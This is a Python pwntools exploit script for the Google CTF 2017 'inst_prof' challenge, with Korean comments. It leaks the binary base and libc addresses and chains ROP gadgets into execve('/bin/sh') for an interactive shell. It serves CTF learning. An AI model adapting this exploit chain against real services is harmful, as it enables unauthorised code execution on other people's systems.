# -*- coding: utf-8 -*-
#
# Google CTF 2017 pwn inst_prof
#
# Based on
# * https://khack40.info
#

import struct
import sys
import subprocess
import socket
import telnetlib
import ctypes
import re
import errno
import time
from pwn import *

# pwntools - CTF framework
# defuse.ca - online x86 assembler
# https://dilsec.com - google ctf 2017 pwnables inst_prof writeup
# WizardsOfDos' CTF writeup @ github

b = ELF('inst_prof')

# CTF 서버에서 사용된는 libc 버전은 ROP 를 통해 구해내야한다. 아래 설명되어있음.
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = 'amd64'
context.log_level = 'info'

# socat TCP-LISTEN:8888,reuseaddr,fork 'SYSTEM:./inst_prof'
#r = remote('localhost', 8888)

r = process('./inst_prof')
gdb.attach(r, '''
'''
)
#raw_input('Go!')

#
# run ROPgadget to collect useful gadgets
#
# $ ROPgadget --binary inst_prof
#0x0000000000000bc3 : pop rdi ; ret
#0x0000000000000bc1 : pop rsi ; pop r15 ; ret

pop_rdi = 0x0000000000000bc3
pop_rsi = 0x0000000000000bc1 

# 4 byte 를 보내야하기 때문에, 4 바이트가 안되면 \xc3 (ret) 또는 \xc3 + \x90 ... ( ret; nop ... ) 을 덧붙인다.
def assemble(ASM):
    CODE = asm(ASM)
    if len(CODE) < 4:
        CODE += asm('ret')
    if len(CODE) < 4:
        CODE = CODE.ljust(4,asm('nop'))
    if len(CODE) > 4:
        print "More than 4 bytes", ASM
        sys.exit(1)
    return CODE

# 스트링을 DE:AD:BE:EF 형태로 프린트해준다.
def hexify(x):
    return ":".join("{:02x}".format(ord(c)) for c in x)

if __name__ == "__main__":

    r.recvuntil('ready')

    # do_test() 를 반복하는 동안 r14, r15 레지스터는 바뀌지 않는다.
    # 4 byte 씩 보내면서 조금씩 뭔가 할때, 유지해야 할 값들은 r14, r15 에 보관한다.
    # 4 byte 를 보내서 돌아갈 주소를 r14 에 보관해놓는다.
    # 15 byte 템플릿을 호출하는 함수는 do_test()
    # 돌아갈 곳은 rdtsc 인스트럭션
    # 이 주소를 알게되면 CODE_BASE 를 계산할 수 있다.
    # r14 := rsp (rsp : 돌아갈 주소, rdtsc 가 있는 CODE_BASE+0xb18)
    #r.send(asm('pop r14; push r14'))
    r.send(assemble('mov r14,[rsp]'))

    buf = r.recvn(8)
    #print "Response: 0x{:016x}".format(u64(buf)) # execution time of (pop r14; push r14) * 10000h

    # 이제 r14 는 rdtsc 가 위치한 메모리를 가리킨다.
    # CODE_BASE 를 stdin 으로 write 해야한다.
    # 적당한 write 함수는 0x8a2 에 위치해있다.
    # 6 byte 를 write 하고 바로 do_test() 로 진입하기 때문에 작업이 끊기지 않는다.
    # dec r14 를 0xb18 - 0x8a2 번 반복한다.
    # decrease r14 to 0x8a2 ( to point 'mov edx,6; mov edi,1; call _write' )
    buf = asm('dec r14\nret') * (0xb18 - 0x8a2)
    r.send(buf)
    r.clean()

    # r14 는 call _write 앞을 가리킨다.
    # r14 가 가리키는 주소로 코드 플로우를 바꿔야한다.
    # 그리고 r14 를 메모리에 쓰고, 그 메모리를 rsi 가 가리켜야한다.
    # push rsp; pop rsi; push r14 를 0x1000 번 반복하면
    # 스택에는 r14의 값인 0x어쩌고8a2 가 0x1000 번 깔리고,
    # rsi 는 이 이 영역을 가리키게 된다.
    # 이제 ret 이 되면 0x어쩌고8a2 로 튈 것이고,
    # call _write 를 통해 rsi 가 가리키고 있는 메모리에 담긴 값, 0x어쩌고8a2 가 표시될 것이다. 
    # leak r14
    # rsi == rsp - 8 ( [rsp-8] == CODE_BASE+0x8a2 )
    # [rsp] == r14 (CODE_BASE+0x8a2)
    r.send( asm('push rsp; pop rsi; push r14') )

    # code 는 어차피 0x0000어쩌구로 로드되기때문에 앞에 2바이트는 몰라도 된다.
    d = r.recvn(6)
    l = d + '\x00\x00'
    #l = d[len(d) - 6:len(d)] + '\x00\x00'
    l = u64(l)
    
    # stdout 으로 leak 된 6 byte 에서 0x8a2 를 빼면 CODE_BASE 가 된다.
    CODE_BASE = l - 0x8a2
    print "Leaked CODE_BASE: 0x{:016x}".format(CODE_BASE)

    # r14 := rsp
    r.send(asm('push rsp\npop r14\nret'))
    r.send(asm('inc r14\nret') * 56)
    # now, r14 points above the stack frame of do_test()
    r.clean()

# turn off the alarm & leak the address of write@got
# ROP gadget 은 github 의 ROPgadget 을 설치해서, 찾아낸다. ( pop rdi; ret ) ( pop rsi; ...; ret )

    ROP = p64(CODE_BASE + pop_rdi)
    ROP += p64(0) # turn off alarm
    ROP += p64(CODE_BASE + b.plt['alarm'])
    ROP += p64(CODE_BASE + pop_rdi)
    ROP += p64(1) # fd
    ROP += p64(CODE_BASE + pop_rsi)
    ROP += p64(CODE_BASE + b.got['write'])
    ROP += p64(0)
    ROP += p64(CODE_BASE + b.plt['write'])
    ROP += p64(CODE_BASE + 0x8c7) # main loop again

# mov rdi, 1
# mov rsi, addr of write@got
# mov r15, 0
# jump to write@plt
# jump to code_base+0x8c7

    print "length of ROP: %d" % len(ROP)
    for x in ROP:
        buf = asm('movb [r14], %#x' % ord(x))
        print hexify(buf)
        r.send(buf)

        buf = asm('inc r14\nret')
        print hexify(buf)
        r.send(buf)

    time.sleep(1)
    r.clean()

    r.send(asm('pop rax\npop rdx\npush rax\nret'))

    # discard the first 8 bytes
    # output: execution time of 'pop rax;pop rdx;push rax;ret' (8 bytes) + write@got (8 bytes)
    d = ''
    while len(d) < 0x10:
        d += r.recvn(1)
    d = d[8:0x10]
    l = u64(d)

    log.info('write@got: %#x' % l)

    # 여기까지가 전반부!
    # 여기까지해서 나온 write@got 를 가지고 libc 버전을 찾아낸다.
    # 문제에는 수행화일만 제공되었지, libc 는 제공되지 않았다.
    # got['write]' 를 읽어냈으면, github 의 libc-database 를 이용해, 하위 3 byte 를 가지고 
    # 어떤 libc 가 씌였는지 찾아낸다.
    # 그 libc 를 구해야한다.

    # libc 를 구했다는 가정하에 여기부터 후반부!

    LIBC_BASE = l - libc.symbols['write']
    log.info('LIBC_BASE: %#x' % LIBC_BASE)

    pause()

    # now ROP stage 2
    r.send(asm('push rsp\npop r14\nret'))
    r.send(asm('inc r14\nret') * 56)
    r.clean()

# mov rdi, "/bin/sh"
# mov rsi, 0
# mov rdx, 0
# call execve
# mov rdi, 0
# call exit

    ROP = p64(CODE_BASE + pop_rdi)
    ROP += p64(LIBC_BASE + libc.search('/bin/sh').next())
    ROP += p64(CODE_BASE + pop_rsi)
    ROP += p64(0)
    ROP += p64(0)
    ROP += p64(LIBC_BASE + libc.search(asm('pop rdx; ret')).next())
    ROP += p64(0)
    ROP += p64(LIBC_BASE + libc.symbols['execve'])
    #ROP += p64(CODE_BASE + pop_rdi)
    #ROP += p64(0)
    #ROP += p64(LIBC_BASE + libc.symbols['_exit'])

    print "length of ROP: %d" % len(ROP)
    for x in ROP:
        buf = asm('movb [r14], %#x' % ord(x))
        print hexify(buf)
        r.send(buf)

        buf = asm('inc r14; ret')
        print hexify(buf)
        r.send(buf)

    r.send(asm('pop rax; pop rdx; push rax; ret'))
    time.sleep(1)
    r.clean()

    r.interactive()
    r.close()

    sys.exit(0)
